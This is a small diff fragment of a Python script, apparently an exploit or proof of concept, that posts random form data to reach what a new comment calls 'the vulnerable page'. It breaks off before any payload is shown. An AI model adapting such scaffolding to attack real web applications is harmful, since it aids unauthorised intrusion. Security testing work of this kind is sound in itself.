@@ -9,12 +9,12 @@ def gen_ran_str(size=15):
 
 s = requests.Session()
 
+#just a request to arrive to the vulnerable page
 r = s.post(url, data={
 	'title': gen_ran_str(),
 	'location': gen_ran_str(),
 	'description': gen_ran_str(),
 	'proposals': gen_ran_str()})
-
 new_url = r.url
 
 r = s.post(new_url, data={
